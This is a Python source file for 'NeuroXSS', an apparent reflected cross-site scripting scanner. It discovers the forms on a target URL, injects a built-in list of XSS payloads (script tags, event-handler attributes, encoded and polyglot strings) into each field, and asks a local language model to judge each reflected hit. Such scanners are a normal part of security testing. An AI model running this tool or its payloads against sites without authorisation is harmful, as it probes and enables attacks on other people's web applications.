#!/usr/bin/env python
"""
NeuroXSS - AI-Powered XSS Scanner
Author: HAKEEM GRAE
GitHub: https://github.com/ndi-tech/NeuroXSS---AI-Powered-XSS-Scanner.git
"""

import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import time
import json
import subprocess
import os
import sys
from datetime import datetime

class NeuroXSS:
    """AI-Powered Cross-Site Scripting Scanner"""
    
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'NeuroXSS-AI/1.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        })
        
        # Auto-detect Ollama installation
        self.ollama_path = self._find_ollama()
        self.vulnerabilities = []
        self.stats = {'forms': 0, 'payloads': 0, 'requests': 0}
        
    def _find_ollama(self):
        """Automatically find Ollama installation across different OS"""
        common_paths = [
            # Windows paths
            os.path.expandvars(r"%LOCALAPPDATA%\Programs\Ollama\ollama.exe"),
            r"C:\Program Files\Ollama\ollama.exe",
            # Linux/Mac paths
            "/usr/local/bin/ollama",
            "/usr/bin/ollama"
        ]
        
        for path in common_paths:
            if os.path.exists(path):
                return path
        return None
    
    def ask_ai(self, payload, response_text):
        """Use local LLM to analyze potential XSS"""
        if not self.ollama_path:
            return "AI unavailable (Ollama not found)"
        
        # Truncate response to avoid token limits
        truncated = response_text[:500] if len(response_text) > 500 else response_text
        
        prompt = f"""Analyze if this is a real XSS vulnerability:

Attack Payload: {payload[:100]}
Server Response: {truncated}

Is this a genuine XSS vulnerability? Answer with YES/NO and brief reason."""

        try:
            result = subprocess.run(
                [self.ollama_path, "run", "phi", prompt],
                capture_output=True,
                text=True,
                timeout=10,
                encoding='utf-8'
            )
            return result.stdout.strip()[:150]
        except Exception as e:
            return f"AI analysis unavailable"
    
    def discover_forms(self):
        """Discover all forms on the target page"""
        try:
            r = self.session.get(self.target_url, timeout=10)
            self.stats['requests'] += 1
            soup = BeautifulSoup(r.text, 'html.parser')
            return soup.find_all('form')
        except Exception as e:
            print(f"❌ Error discovering forms: {e}")
            return []
    
    def test_form(self, form):
        """Test a single form for XSS vulnerabilities"""
        action = form.get('action', '')
        method = form.get('method', 'get').lower()
        
        # Get input fields
        inputs = []
        for inp in form.find_all(['input', 'textarea']):
            name = inp.get('name')
            inp_type = inp.get('type', '').lower()
            if name and inp_type not in ['submit', 'button', 'image']:
                inputs.append(name)
        
        if not inputs:
            return []
        
        target = urljoin(self.target_url, action)
        results = []
        
        # Comprehensive XSS payloads
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "\" onmouseover=\"alert(1)\"",
            "' onfocus='alert(1)' autofocus",
            "<svg/onload=alert(1)>",
            "javascript:alert(1)",
            "<body onload=alert(1)>",
            "<ScRiPt>alert(1)</ScRiPt>",
            "%3Cscript%3Ealert(1)%3C/script%3E",
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */alert(1) )"
        ]
        
        print(f"\n  📍 Testing: {target}")
        print(f"  🎯 Inputs: {', '.join(inputs)}")
        
        for payload in payloads:
            self.stats['payloads'] += 1
            data = {name: payload for name in inputs}
            
            try:
                if method == 'post':
                    r = self.session.post(target, data=data, timeout=5)
                else:
                    r = self.session.get(target, params=data, timeout=5)
                
                self.stats['requests'] += 1
                
                # Check if payload is reflected
                if payload in r.text:
                    print(f"    ✅ XSS Detected!")
                    
                    # Get AI analysis
                    ai_response = self.ask_ai(payload, r.text)
                    
                    results.append({
                        'url': target,
                        'method': method.upper(),
                        'payload': payload[:100],
                        'inputs': inputs,
                        'status_code': r.status_code,
                        'ai_analysis': ai_response,
                        'timestamp': datetime.now().isoformat()
                    })
                
                time.sleep(0.2)  # Rate limiting
                
            except Exception as e:
                continue
        
        return results
    
    def scan(self):
        """Main scanning function"""
        self._print_banner()
        
        # Discover forms
        print("\n📡 Discovering forms...")
        forms = self.discover_forms()
        self.stats['forms'] = len(forms)
        print(f"Found {len(forms)} form(s)")
        
        # Test each form
        for i, form in enumerate(forms, 1):
            print(f"\n📝 Testing Form {i}/{len(forms)}")
            vulns = self.test_form(form)
            self.vulnerabilities.extend(vulns)
        
        # Generate report
        self._print_summary()
        self._save_results()
        
        return self.vulnerabilities
    
    def _print_banner(self):
        """Print scanner banner"""
        banner = """
╔══════════════════════════════════════════════════════════╗
║                   NeuroXSS Scanner v1.0                  ║
║            AI-Powered Cross-Site Scripting Detector      ║
╚══════════════════════════════════════════════════════════╝
        """
        print(banner)
        print(f"Target: {self.target_url}")
        print(f"AI Model: {'phi (available)' if self.ollama_path else 'AI disabled'}")
        print("-" * 60)
    
    def _print_summary(self):
        """Print scan summary"""
        print("\n" + "=" * 60)
        print("📊 SCAN SUMMARY")
        print("=" * 60)
        print(f"Forms tested: {self.stats['forms']}")
        print(f"Payloads tested: {self.stats['payloads']}")
        print(f"Requests made: {self.stats['requests']}")
        print(f"Vulnerabilities found: {len(self.vulnerabilities)}")
        
        if self.vulnerabilities:
            print("\n🔴 VULNERABILITIES:")
            for i, v in enumerate(self.vulnerabilities, 1):
                print(f"\n  {i}. {v['url']}")
                print(f"     Payload: {v['payload'][:50]}...")
    
    def _save_results(self):
        """Save results to JSON file"""
        report = {
            'scan_info': {
                'target': self.target_url,
                'timestamp': datetime.now().isoformat(),
                'ai_enabled': self.ollama_path is not None
            },
            'statistics': self.stats,
            'vulnerabilities': self.vulnerabilities
        }
        
        filename = f"neuroxss_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2)
        
        print(f"\n💾 Report saved: {filename}")

def main():
    if len(sys.argv) < 2:
        print("Usage: python neuroxss_scanner.py <target_url>")
        print("Example: python neuroxss_scanner.py http://localhost:5000")
        sys.exit(1)
    
    target = sys.argv[1]
    scanner = NeuroXSS(target)
    scanner.scan()

if __name__ == "__main__":
    main()